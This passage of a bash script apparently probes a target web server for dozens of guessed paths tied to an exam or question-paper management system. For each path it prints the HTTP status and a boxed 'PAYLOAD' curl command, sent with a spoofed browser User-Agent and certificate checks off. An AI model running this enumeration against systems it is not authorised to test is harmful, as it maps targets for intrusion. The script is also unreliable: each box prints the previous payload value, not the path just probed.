         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
